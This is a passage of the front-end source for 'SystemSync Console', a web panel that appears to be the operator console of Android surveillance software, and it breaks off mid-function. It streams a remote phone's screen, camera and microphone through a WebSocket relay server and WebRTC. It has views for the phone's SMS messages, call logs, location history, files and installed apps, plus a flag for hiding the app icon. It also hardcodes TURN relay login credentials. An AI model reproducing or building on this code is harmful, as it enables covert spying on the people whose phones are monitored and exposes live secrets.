<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- CSS Variables for consistent theming ---------- */
        :root {
            --primary-color: #1976ff;
            --primary-dark: #0d5bca;
            --danger-color: #d32f2f;
            --danger-dark: #b71c1c;
            --success-color: #4caf50;
            --success-dark: #388e3c;
            --warning-color: #ff9800;
            --warning-dark: #f57c00;
            --incoming-color: #4caf50;
            --outgoing-color: #1976ff;
            --missed-color: #d32f2f;
            --text-primary: #1a2634;
            --text-secondary: #2c3e50;
            --text-muted: #7b8a9b;
            --bg-sidebar: #ffffff;
            --bg-main: #f5f7fa;
            --bg-panel: #ffffff;
            --border-color: #e0e4e8;
            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
            --shadow-lg: 0 4px 20px rgba(0,0,0,0.1);
            
            --btn-height: 44px;
            --btn-padding: 12px;
            --btn-icon-size: 20px;
            --font-size-base: 14px;
            --font-size-small: 12px;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            background: var(--bg-main);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: var(--text-primary);
        }

        #sidebar {
            width: 280px;
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border-color);
            padding: 20px;
            overflow-y: auto;
            box-shadow: var(--shadow-sm);
            transition: transform 0.3s ease;
            z-index: 1000;
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            #sidebar {
                position: fixed;
                top: 0;
                left: 0;
                bottom: 0;
                transform: translateX(-100%);
                z-index: 2000;
                width: 85%;
                max-width: 320px;
                box-shadow: var(--shadow-lg);
            }
            
            #sidebar.show {
                transform: translateX(0);
            }
            
            .sidebar-overlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.5);
                z-index: 1500;
            }
            
            .sidebar-overlay.show {
                display: block;
            }
            
            #main {
                width: 100%;
                height: 100%;
            }
            
            #header {
                padding: 0 10px !important;
                height: 52px !important;
            }
            
            .header-left {
                flex: 1;
                gap: 8px !important;
            }
            
            .header-right {
                gap: 6px !important;
            }
            
            #deviceSelector {
                max-width: 120px;
                min-width: 100px;
                font-size: 12px;
            }
            
            .header-left > span {
                display: none; /* hide "SystemSync" text on mobile to save space */
            }
        }

        #header {
            height: 52px;
            min-height: 52px;
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            font-weight: 600;
            color: var(--text-primary);
            overflow: hidden;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
            flex: 1;
            min-width: 0;
            overflow: hidden;
        }

        .menu-btn {
            display: none;
            background: transparent;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text-primary);
            padding: 8px;
            width: auto;
            margin: 0;
        }

        @media (max-width: 768px) {
            .menu-btn {
                display: flex !important;
                align-items: center;
                justify-content: center;
            }
        }

        .device-selector-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #deviceSelector {
            padding: 4px 10px;
            height: 32px;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            background: white;
            font-size: 13px;
            min-width: 160px;
            max-width: 200px;
            cursor: pointer;
        }

        .device-count {
            background: var(--primary-color);
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: var(--font-size-small);
            font-weight: 600;
            white-space: nowrap;
        }

        /* Disconnect button — small icon button beside status */
        .disconnect-btn {
            background: transparent;
            color: var(--danger-color);
            border: 1px solid var(--danger-color);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            min-width: 28px;
            padding: 0;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.15s;
            title: "Disconnect";
        }

        .disconnect-btn:hover {
            background: var(--danger-color);
            color: white;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-shrink: 0;
        }

        #batteryInfo {
            display: none;
            align-items: center;
            gap: 5px;
            padding: 3px 8px;
            height: 28px;
            background: #f0f2f5;
            border-radius: 14px;
            font-size: 12px;
        }

        .battery-icon {
            position: relative;
            width: 36px;
            height: 18px;
            border: 2px solid #555;
            border-radius: 4px;
            background: #fff;
        }

        .battery-level {
            position: absolute;
            top: 2px;
            left: 2px;
            height: 14px;
            background: #4caf50;
            border-radius: 2px;
        }

        .battery-icon.charging:after {
            content: "⚡";
            position: absolute;
            top: -12px;
            left: 10px;
            font-size: 18px;
        }

        .battery-percent {
            font-weight: 600;
            min-width: 45px;
        }

        #status {
            padding: 3px 10px;
            height: var(--btn-height);
            border-radius: 30px;
            background: #e8f0fe;
            color: var(--primary-color);
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            white-space: nowrap;
        }

        #status.offline {
            background: #ffebee;
            color: var(--danger-color);
        }

        .reconnect-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 20px;
            padding: 0 15px;
            height: 28px;
            font-size: 16px;
            cursor: pointer;
            white-space: nowrap;
        }

        #main {
            flex: 1;
            display: flex;
            height: 100vh;
            flex-direction: column;
            min-width: 0;
            background: var(--bg-main);
        }

        #content {
            flex: 1;
            padding: 20px;
            overflow: auto;
            min-height: 0; /* required: allows flex child to shrink below content size */
        }

        #main-panel {
            background: var(--bg-panel);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
            padding: 20px;
            min-height: 100%;
            position: relative;
        }

        #welcomeMessage {
            text-align: center;
            padding: 40px 20px;
        }

        .device-card {
            background: #fff;
            border: 2px solid var(--border-color);
            border-radius: 16px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.18s;
            display: flex;
            flex-direction: column;
            gap: 6px;
            box-shadow: var(--shadow-sm);
        }
        .device-card.active {
            border-color: #1976ff;
            box-shadow: 0 0 0 2px rgba(25,118,255,0.25);
        }
        .device-card:hover {
            border-color: var(--primary-color);
            box-shadow: 0 4px 16px rgba(25,118,255,0.15);
            transform: translateY(-2px);
        }
        .device-card .dc-icon { font-size: 32px; }
        .device-card .dc-name { font-weight: 700; font-size: 15px; color: #1a2634; }
        .device-card .dc-detail { font-size: 12px; color: #7b8a9b; }
        .device-card .dc-status {
            font-size: 11px;
            font-weight: 600;
            color: #2e7d32;
            background: #e8f5e9;
            padding: 2px 8px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 4px;
            width: fit-content;
        }

        #welcomeMessage h2 {
            color: var(--text-primary);
            margin-bottom: 15px;
        }

        #welcomeMessage p {
            color: var(--text-muted);
            margin: 10px 0;
        }

        .logo {
            font-size: 20px;
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 30px;
        }

        .section {
            margin-bottom: 25px;
        }

        .section-title {
            font-size: var(--font-size-small);
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
        }

        button {
            width: 100%;
            height: var(--btn-height);
            padding: 0 var(--btn-padding);
            margin: 4px 0;
            background: white;
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: var(--font-size-base);
            text-align: left;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
        }

        button:hover {
            background: var(--primary-color);
            color: white;
            border-color: var(--primary-color);
        }

        button span:first-child {
            font-size: var(--btn-icon-size);
            min-width: 24px;
            text-align: center;
        }

        .camera-panel {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            display: none;
        }

        .camera-panel.show {
            display: block;
        }

        .camera-option {
            margin: 10px 0;
        }

        .camera-option label {
            margin-right: 20px;
            color: var(--text-primary);
            font-size: var(--font-size-base);
            cursor: pointer;
        }

        .camera-option input[type="radio"],
        .camera-option input[type="checkbox"] {
            margin-right: 5px;
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .capture-btn, .live-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            height: var(--btn-height);
            padding: 0 var(--btn-padding);
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-weight: 600;
            justify-content: center;
        }

        .capture-btn:hover, .live-btn:hover {
            background: var(--primary-dark);
        }

        .capture-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        .capture-controls button {
            flex: 1;
            background: var(--danger-color);
            color: white;
            border: none;
        }

        .capture-controls button:hover {
            background: var(--danger-dark);
        }

        .live-controls {
            display: flex;
            gap: 8px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .live-controls button {
            flex: 1;
            min-width: 100px;
            background: var(--primary-color);
            color: white;
            border: none;
            height: var(--btn-height);
            padding: 0 8px;
            border-radius: 6px;
            cursor: pointer;
            justify-content: center;
        }

        .live-controls button.stop {
            background: var(--danger-color);
        }

        .live-controls button.stop:hover {
            background: var(--danger-dark);
        }

        .file-manager {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: var(--bg-panel);
            z-index: 10;
            padding-bottom: 15px;
            margin-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .file-toolbar {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .file-toolbar button {
            width: auto;
            min-width: 80px;
            height: var(--btn-height);
            padding: 0 12px;
            background: white;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            cursor: pointer;
            font-size: var(--font-size-base);
            margin: 0;
        }

        .file-path {
            background: #f0f2f5;
            padding: 0 15px;
            height: var(--btn-height);
            border-radius: 20px;
            font-size: var(--font-size-base);
            color: var(--text-secondary);
            flex: 1;
            display: flex;
            align-items: center;
            overflow-x: auto;
            white-space: nowrap;
        }

        .file-panes {
            display: flex;
            gap: 20px;
            flex: 1;
            overflow: hidden;
            min-height: 400px;
        }

        @media (max-width: 768px) {
            .file-panes {
                flex-direction: column;
                gap: 10px;
            }
            
            .folder-pane, .file-pane {
                max-height: 300px;
            }
        }

        .folder-pane, .file-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 15px;
            overflow-y: auto;
            border: 1px solid var(--border-color);
        }

        .pane-title {
            font-size: var(--font-size-small);
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .folder-item, .file-item {
            display: flex;
            align-items: center;
            padding: 8px 10px;
            border-radius: 6px;
            cursor: pointer;
            gap: 10px;
            margin-bottom: 2px;
            min-height: 40px;
        }

        .folder-item:hover {
            background: #e3f2fd;
        }

        .file-item {
            cursor: default;
        }

        .file-item:hover {
            background: #f5f5f5;
        }

        .folder-icon, .file-icon {
            font-size: 18px;
            min-width: 24px;
            text-align: center;
        }

        .folder-name, .file-name {
            flex: 1;
            font-size: var(--font-size-base);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .folder-name {
            color: var(--primary-color);
        }

        .file-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            margin-right: 5px;
        }

        .file-size {
            color: var(--text-muted);
            font-size: var(--font-size-small);
            margin: 0 10px;
            white-space: nowrap;
        }

        .file-actions {
            display: flex;
            gap: 5px;
        }

        .file-actions button {
            width: 32px;
            height: 32px;
            padding: 0;
            min-width: unset;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            margin: 0;
        }

        .file-actions button.delete {
            color: var(--danger-color);
            border-color: var(--danger-color);
        }

        .file-actions button.delete:hover {
            background: var(--danger-color);
            color: white;
        }

        .download-selected {
            margin-top: 15px;
            text-align: right;
        }

        .download-selected button {
            width: auto;
            min-width: 180px;
            height: var(--btn-height);
            padding: 0 20px;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 500;
        }

        /* FIXED: Table styles with colors for call types and SMS */
        .sms-table, .call-table {
            width: 100%;
            border-collapse: collapse;
            font-size: var(--font-size-base);
        }

        .sms-table th, .call-table th {
            background: #f8fafd;
            color: var(--text-primary);
            font-weight: 600;
            padding: 12px 10px;
            text-align: left;
            border-bottom: 2px solid var(--border-color);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .sms-table td, .call-table td {
            padding: 10px;
            border-bottom: 1px solid #eef2f5;
            color: var(--text-secondary);
            word-break: break-word;
        }

        .sms-table tr:hover, .call-table tr:hover {
            background: #f5f9ff;
        }

        /* Color coding for SMS */
        .sms-incoming {
            border-left: 4px solid var(--incoming-color);
        }
        .sms-outgoing {
            border-left: 4px solid var(--outgoing-color);
        }

        /* Color coding for call logs */
        .call-incoming {
            border-left: 4px solid var(--incoming-color);
        }
        .call-outgoing {
            border-left: 4px solid var(--outgoing-color);
        }
        .call-missed {
            border-left: 4px solid var(--missed-color);
        }
        .call-rejected {
            border-left: 4px solid var(--warning-color);
        }

        .call-type-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .call-type-incoming {
            background: rgba(76, 175, 80, 0.1);
            color: var(--incoming-color);
        }
        .call-type-outgoing {
            background: rgba(25, 118, 255, 0.1);
            color: var(--outgoing-color);
        }
        .call-type-missed {
            background: rgba(211, 47, 47, 0.1);
            color: var(--missed-color);
        }
        .call-type-rejected {
            background: rgba(255, 152, 0, 0.1);
            color: var(--warning-color);
        }

        @media (max-width: 768px) {
            .sms-table, .call-table {
                font-size: 12px;
            }
            
            .sms-table th, .call-table th,
            .sms-table td, .call-table td {
                padding: 8px 5px;
            }
        }

        #map {
            height: 400px;
            border-radius: 10px;
        }

        .map-info {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            background: rgba(255,255,255,0.95);
            padding: 12px;
            border-radius: 8px;
            box-shadow: var(--shadow-sm);
            font-size: var(--font-size-base);
            color: var(--text-primary);
            z-index: 1000;
            border-left: 4px solid var(--primary-color);
            max-width: 300px;
        }

        @media (max-width: 768px) {
            .map-info {
                left: 10px;
                right: 10px;
                max-width: none;
                font-size: 12px;
            }
        }

        .app-item {
            display: flex;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .app-icon {
            width: 48px;
            height: 48px;
            margin-right: 15px;
            background: #f0f2f5;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .app-details {
            flex: 1;
            min-width: 0;
        }

        .app-name {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .app-package {
            font-size: 11px;
            color: var(--text-muted);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .app-actions {
            display: flex;
            gap: 8px;
        }

        .app-actions button {
            width: auto;
            min-width: 70px;
            height: 36px;
            padding: 0 12px;
            font-size: 12px;
            margin: 0;
            justify-content: center;
        }

        .app-actions button.open {
            background: var(--primary-color);
            color: white;
            border: none;
        }

        .app-actions button.uninstall {
            background: var(--danger-color);
            color: white;
            border: none;
        }

        /* ── Screen-share modal: strict 9:16, viewport-relative ────────────
           The popup height = 92vh. Width is always height × (9/16) so the
           aspect ratio is locked regardless of screen size or zoom level.
           Controls bar is a fixed 72px — never changes size.
           Video area fills everything above the controls bar.
        ─────────────────────────────────────────────────────────────── */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.88);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .modal-overlay.show {
            display: flex;
        }

        .mobile-popup {
            /* Height = 92% of viewport height, width locked to 9:16 ratio */
            height: 92vh;
            width: calc(92vh * 9 / 16);
            /* Safety: if screen is narrower than the popup, clamp to 98vw
               and recalculate height to maintain ratio */
            max-width: 98vw;
            max-height: calc(98vw * 16 / 9);
            display: flex;
            flex-direction: column;
            background: #0f0f0f;
            border-radius: 20px;
            border: 3px solid #2e2e2e;
            box-shadow: 0 24px 80px rgba(0,0,0,0.9);
            overflow: hidden;
            flex-shrink: 0;
        }

        .phone-frame {
            flex: 1;        /* fills ALL space above the controls bar */
            min-height: 0;  /* critical: allows shrink below content height */
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
            overflow: hidden;
            width: 100%;
        }

        .phone-frame video {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* Controls bar: fixed 72px — never moves or resizes */
        .popup-controls {
            flex-shrink: 0;
            height: 72px;
            min-height: 72px;
            max-height: 72px;
            background: #111;
            border-top: 1px solid #333;
            display: flex;
            gap: 8px;
            justify-content: center;
            align-items: center;
            padding: 0 12px;
        }

        .popup-controls button {
            width: 52px;
            height: 52px;
            min-width: 52px;
            max-width: 52px;
            min-height: 52px;
            max-height: 52px;
            padding: 0;
            background: #1e1e1e;
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.15s, transform 0.1s;
            margin: 0;
            flex: none;
        }

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;

    let mediaRecorder = null;
    let recordedChunks = [];

    let pendingCommand = null;

    let devices = new Map();
    let currentDeviceId = null;

    let currentBatteryLevel = 0;
    let currentBatteryStatus = 'unknown';

    // Audio recording variables
    let audioMediaRecorder = null;
    let audioRecordedChunks = [];

    // Screen recording variables
    let screenMediaRecorder = null;
    let screenRecordedChunks = [];

    // Activity timeline
    let activityTimeline = [];

    // Location history (last 20 points)
    const locationHistory = [];

    // Track pending file downloads
    let pendingDownloads = new Map();

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');

    // NEW: Function to clear camera panel
    function clearCameraPanel() {
        panel.innerHTML = '<div id="welcomeMessage"><h2>👋 Ready</h2><p>Click any button to start.</p></div>';
        logActivity('Camera panel cleared');
    }

    // NEW: Function to disconnect device
    function disconnectDevice() {
        if (currentDeviceId) {
            // Close all peer connections
            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            if (cameraPC) {
                cameraPC.close();
                cameraPC = null;
            }
            if (audioPC) {
                audioPC.close();
                audioPC = null;
            }
            if (mediaRecorder) {
                mediaRecorder.stop();
                mediaRecorder = null;
            }
            if (audioMediaRecorder) {
                audioMediaRecorder.stop();
                audioMediaRecorder = null;
            }
            if (screenMediaRecorder) {
                screenMediaRecorder.stop();
                screenMediaRecorder = null;
            }

            // Clear current device selection
            currentDeviceId = null;
            document.getElementById('deviceSelector').value = '';
            showWelcomeMessage(true);
            
            // currentDeviceId is still valid here — send before clearing
            const disconnectingId = currentDeviceId;
            if (ws && ws.readyState === WebSocket.OPEN && disconnectingId) {
                ws.send(JSON.stringify({
                    type: 'DISCONNECT',
                    deviceId: disconnectingId
                }));
            }

            panel.innerHTML = '<div id="welcomeMessage"><h2>👋 Device Disconnected</h2><p>Select another device to continue.</p></div>';
            logActivity('Device disconnected');
            showNotification('Device disconnected');
        }
    }

    function logActivity(action) {
        const time = new Date().toLocaleTimeString();
        activityTimeline.unshift({ time, action });
        if (activityTimeline.length > 100) activityTimeline.pop();
        console.log('Activity:', action);
    }

    function showActivityTimeline() {
        logActivity('Viewed activity timeline');
        let html = '<h3>📜 Activity Timeline</h3>';
        html += '<div style="max-height:500px;overflow:auto;">';

        if (activityTimeline.length === 0) {
            html += '<p style="padding:20px;text-align:center;color:#7b8a9b;">No activities recorded yet</p>';
        } else {
            activityTimeline.forEach(e => {
                html += `
                <div class="timeline-item">
                    <span class="timeline-action">${e.action}</span>
                    <span class="timeline-time">${e.time}</span>
                </div>`;
            });
        }

        html += '</div>';
        panel.innerHTML = html;
    }
    
    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }

    // FIXED: Format duration as MM:SS
    function formatDuration(seconds) {
        if (!seconds && seconds !== 0) return '00:00';
        const mins = Math.floor(seconds / 60);
        const secs = Math.floor(seconds % 60);
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    const ICE_SERVERS = [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "stun:stun2.l.google.com:19302" },
        { urls: "stun:stun3.l.google.com:19302" },
        { urls: "stun:stun4.l.google.com:19302" },
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        // deviceId required so multi-device server routes to correct device
        const payload = {
            type: 'SIGNALING',
            deviceId: currentDeviceId,
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type, msg);
        logActivity(`Signaling: ${msg.type}`);
    }

    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ 
            iceServers: ICE_SERVERS,
            iceCandidatePoolSize: 10
        });

        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = (e) => {
            console.log(`🎥 Track received for ${streamType}:`, e.streams);
            onTrackCallback(e);
        };

        pc.onicecandidate = (e) => {
            if (e.candidate) {
                console.log(`❄️ ICE candidate for ${streamType}:`, e.candidate);
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };

        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'connected') {
                showNotification(`${streamType} connected`);
                logActivity(`${streamType} connected`);
            } else if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    closeScreenModal();
                    logActivity('Screen share disconnected');
                    showNotification('Screen share disconnected');
                } else if (streamType === 'audio') {
                    stopLiveAudio();
                } else if (streamType === 'camera') {
                    logActivity('Camera stream disconnected');
                }
            }
        };

        pc.onconnectionstatechange = () => {
            console.log(`${streamType} connection state:`, pc.connectionState);
        };

        return pc;
    }

    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                console.log(`Setting remote answer for ${msg.streamType}`);
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer)
                    .then(() => console.log('Remote description set successfully'))
                    .catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                console.log(`Adding ICE candidate for ${msg.streamType}`);
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate))
                    .then(() => console.log('ICE candidate added successfully'))
                    .catch(e => console.error('Error adding ICE candidate:', e));
            }
        }
    }

    function openScreenModal() {
        modalOverlay.classList.add('show');
        document.body.classList.add('modal-open');
        modalRecordBtn.innerText = '🔴';
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        screenMediaRecorder = null;
        screenRecordedChunks = [];
    }

    function closeScreenModal() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        modalOverlay.classList.remove('show');
        document.body.classList.remove('modal-open');
        modalRecordBtn.innerText = '🔴';
    }

    function stopScreenAndCloseModal() {
        // Full stop: send STOP_SCREEN to device, reset state, close modal
        if (screenPC) {
            screenPC.close();
            screenPC = null;
        }
        screenActive = false;
        document.getElementById('screenBtn').innerText = 'Start Screen';
        sendSignalingMessage({ type: 'STOP_SCREEN' });
        closeScreenModal();
        logActivity('Stopped screen share');
        showNotification('Screen share stopped');
    }

    async function toggleScreen() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

        if (screenActive) {
            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            document.getElementById('screenBtn').innerText = 'Start Screen';
            screenActive = false;
            closeScreenModal();
            sendSignalingMessage({ type: 'STOP_SCREEN' });
            logActivity('Stopped screen share');
            showNotification('Screen share stopped');
        } else {
            openScreenModal();
            modalVideo.srcObject = null;

            console.log('Creating screen peer connection...');
            screenPC = createPeerConnection('screen', (e) => {
                console.log('🎬 Screen track received:', e.streams);
                if (e.streams && e.streams[0]) {
                    modalVideo.srcObject = e.streams[0];
                    modalVideo.play().catch(err => console.error('Error playing video:', err));
                    showNotification('Screen share connected');
                    logActivity('Screen share connected');
                }
            }, false);

            try {
                console.log('Creating offer...');
                const offer = await screenPC.createOffer({
                    offerToReceiveVideo: true,
                    offerToReceiveAudio: false
                });
                console.log('Offer created:', offer);
                
                await screenPC.setLocalDescription(offer);
                console.log('Local description set');
                
                sendSignalingMessage({
                    type: 'OFFER',
                    sdp: offer.sdp,
                    streamType: 'screen'
                });
                
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                screenActive = true;
                logActivity('Started screen share');
                showNotification("Screen sharing started. Waiting for connection...");
                
            } catch (e) {
                console.error('Screen share failed:', e);
                showNotification('Failed: ' + e.message);
                if (screenPC) {
                    screenPC.close();
                    screenPC = null;
                }
                closeScreenModal();
            }
        }
    }

    function snapScreenFromModal() {
        if (!modalVideo || !modalVideo.videoWidth) {
            alert('No active screen share or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;
        canvas.getContext('2d').drawImage(modalVideo, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.download = `screenImage-${getFormattedDateTime()}.png`;
            a.href = url;
            a.click();
            URL.revokeObjectURL(url);
            logActivity('Screen snapshot captured');
        }, 'image/png');
    }

    function toggleScreenRecording() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
            modalRecordBtn.innerText = '🔴';
            logActivity('Screen recording stopped');
        } else {
            if (!modalVideo.srcObject) {
                alert('No active screen share');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = modalVideo.srcObject;

            if (modalVideo.videoWidth === 0) {
                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
            } else {
                startScreenRecording(canvas, ctx, stream);
            }
            logActivity('Screen recording started');
        }
    }

    function startScreenRecording(canvas, ctx, originalStream) {
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;

        function drawVideoFrame() {
            if (modalVideo.readyState === modalVideo.HAVE_ENOUGH_DATA) {
                ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
            }
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        screenMediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) screenRecordedChunks.push(e.data);
        };
        screenMediaRecorder.onstop = () => {
            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
            logActivity('Screen recording saved');
        };
        screenMediaRecorder.start();
        modalRecordBtn.innerText = '🟢';
    }

    function toggleFullscreen() {
        if (!document.fullscreenElement) {
            modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
            logActivity('Screen share fullscreen');
        } else {
            document.exitFullscreen();
        }
    }

    async function startLiveStream() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

